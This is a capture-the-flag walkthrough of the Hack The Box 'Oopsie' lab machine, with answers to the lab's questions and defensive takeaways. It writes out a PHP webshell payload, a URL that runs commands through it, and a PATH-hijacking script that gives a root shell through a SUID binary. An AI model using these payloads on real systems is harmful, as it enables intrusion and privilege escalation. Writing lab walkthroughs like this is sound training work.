# Oopsie

[Oopsie Machine](https://app.hackthebox.com/machines/Oopsie)

This machine is best watched on the YouTube video where we go through the full thought process in real time.

[YouTube Video](https://youtu.be/sBXESSUBRB4)

## Questions

> With what kind of tool can intercept web traffic?
>> proxy

> What is the path to the directory on the webserver that returns a login page?
>> /cdn-cgi/login

> What can be modified in Firefox to get access to the upload page?
>> cookie

> What is the access ID of the admin user?
>> 34322

> On uploading a file, what directory does that file appear in on the server?
>> /uploads

> What is the file that contains the password that is shared with the robert user?
>> db.php

> What executable is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?
>> find

> Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?
>> root

> What SUID stands for?
>> Set owner User ID

> What is the name of the executable being called in an insecure manner?
>> cat

## Attack Chain Summary

This box demonstrates how cookie manipulation, IDOR, file upload abuse, and SUID binary exploitation chain together for full system compromise.

### Phase 1: Enumeration

- Scan the target with Nmap.

        nmap -sV -sC ${MACHINE_IP}

- HTTP is running on port 80. Browse to the web application.
- Discover the login page at `/cdn-cgi/login`.

### Phase 2: Cookie Manipulation and IDOR

- Log in with any available credentials or as a guest user.
- The application uses cookies to manage access levels. The upload page is restricted to admin users.
- Use IDOR to discover the admin user's access ID by enumerating user accounts. The admin access ID is `34322`.
- Modify your cookie values in Firefox to include the admin access ID, granting you access to the upload functionality.

### Phase 3: File Upload and Webshell

- The upload page is now accessible. Upload a PHP webshell.

        <?php system($_GET['cmd']); ?>

- Uploaded files appear in the `/uploads` directory on the server.
- Access the webshell to execute commands on the system.

        http://${MACHINE_IP}/uploads/shell.php?cmd=whoami

### Phase 4: Credential Discovery

- Enumerate the web application's source files on the server.
- Find `db.php` which contains database credentials shared with the `robert` user.
- Use the discovered password to SSH in as robert or switch users.

### Phase 5: User Flag

- Read the user flag from robert's home directory.

        cat ~/user.txt

### Phase 6: Privilege Escalation via SUID PATH Hijacking

- Look for interesting group memberships and files.

        find / -group bugtracker 2>/dev/null

- Discover a `bugtracker` binary that has the SUID bit set, meaning it runs with root privileges regardless of who executes it.
- Analyze the binary and discover it calls `cat` without specifying the full path (`/bin/cat`).
- Exploit this by creating a malicious `cat` in a directory we control and prepending that directory to our PATH.

        cd /tmp
        echo '#!/bin/bash' > cat
        echo '/bin/bash' >> cat
        chmod +x cat
        export PATH=/tmp:$PATH
        /usr/bin/bugtracker

- When bugtracker runs, it calls our fake `cat` instead of `/bin/cat`, spawning a root shell.
- Read the root flag.

        /bin/cat /root/root.txt

## Key Takeaways

- **Never trust client-side cookies for access control.** Cookies are user-controlled. The server must validate permissions on every request, not rely on cookie values the client sends.

- **IDOR exposes data across user boundaries.** Predictable access IDs allowed us to discover the admin's ID and impersonate them.

- **Credentials in source code are a common finding.** Database configuration files like `db.php` frequently contain credentials that are reused across services.

- **SUID binaries that call commands without full paths are exploitable.** If a SUID binary calls `cat` instead of `/bin/cat`, an attacker can hijack the PATH to execute arbitrary code as root.

- **Always use full paths in privileged scripts.** Any script or binary running with elevated privileges should reference commands by their absolute paths to prevent PATH hijacking.

## Tools Used

- Nmap
- Burp Suite (proxy)
- Firefox (cookie manipulation)
- PHP webshell
- find (group enumeration)
- PATH hijacking (privilege escalation)